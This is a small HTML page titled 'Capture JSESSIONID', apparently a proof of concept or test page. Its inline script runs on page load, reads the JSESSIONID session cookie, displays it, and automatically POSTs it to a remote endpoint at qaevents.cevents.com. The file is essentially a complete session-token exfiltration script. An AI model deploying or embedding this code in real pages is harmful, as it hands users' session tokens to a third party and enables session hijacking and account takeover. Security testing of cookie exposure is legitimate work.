<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Capture JSESSIONID</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <script>
        document.addEventListener("DOMContentLoaded", function () {
            // Function to get a specific cookie value
            function getCookie(name) {
                const cookies = document.cookie.split('; ');
                for (const cookie of cookies) {
                    const [key, value] = cookie.split('=');
                    if (key === name) {
                        return value;
                    }
                }
                return null;
            }

            // Function to send JSESSIONID to the server
            function sendJsessionId(jsessionId) {
                fetch('https://qaevents.cevents.com/view', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ jsessionid: jsessionId })
                })
                .then(response => response.json())
                .then(data => {
                    document.getElementById("response").innerHTML = 
                        `<strong>Server Response:</strong> ${data.message}`;
                })
                .catch(error => {
                    document.getElementById("response").innerHTML = 
                        `<strong>Error:</strong> Unable to contact server.`;
                    console.error('Error:', error);
                });
            }

            // Capture JSESSIONID
            const jsessionId = getCookie('JSESSIONID');

            if (jsessionId) {
                document.getElementById("status").innerText = `Captured JSESSIONID: ${jsessionId}`;
                sendJsessionId(jsessionId);
            } else {
                document.getElementById("status").innerText = "JSESSIONID not found in cookies.";
            }
        });
    </script>
</head>
<body>
    <div class="container text-center mt-5">
        <h1>Capture JSESSIONID</h1>
        <p id="status" class="text-success"></p>
        <p id="response" class="text-info mt-3"></p>
    </div>
</body>
</html>